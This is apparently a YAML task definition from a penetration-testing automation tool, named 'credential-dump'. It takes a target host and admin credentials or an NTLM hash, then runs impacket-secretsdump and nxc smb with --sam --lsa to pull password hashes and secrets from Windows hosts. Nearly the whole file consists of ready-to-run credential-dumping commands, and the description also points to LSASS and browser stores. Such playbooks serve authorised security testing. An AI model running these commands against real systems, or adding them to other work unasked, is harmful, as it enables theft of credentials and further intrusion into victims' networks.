name: credential-dump
description: Credential dumping — extract credentials from compromised hosts using
  secretsdump, SAM, LSASS, and browser stores.
tags:
- post
- credential
- dump
- secretsdump
- sam
- lsass
dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target IP or hostname
      alias: t
    username:
      required: true
      type: string
      description: Admin username
    password:
      type: string
      default: ''
      description: Password
    hash:
      type: string
      default: ''
      description: NTLM hash for pass-the-hash
    log_command:
      type: string
      default: 'true'
      description: Enable command logging
jobs:
  dump-creds:
    name: Credential Dumping
    steps:
    - name: secretsdump
      run: impacket-secretsdump {{ inputs.username }}:{{ inputs.password }}@{{ inputs.target
        }} -outputfile {{ env.OFX_RUN_DIR }}/secretsdump 2>&1 | tee {{ env.OFX_RUN_DIR
        }}/secretsdump_log.txt
      continue-on-error: true
      log-command: '{{ inputs.log_command }}'
      timeout: 120
    - name: nxc-dump
      run: nxc smb {{ inputs.target }} -u {{ inputs.username }} -p "{{ inputs.password
        }}" --sam --lsa 2>&1 | tee {{ env.OFX_RUN_DIR }}/nxc_dump.txt
      continue-on-error: true
      log-command: '{{ inputs.log_command }}'
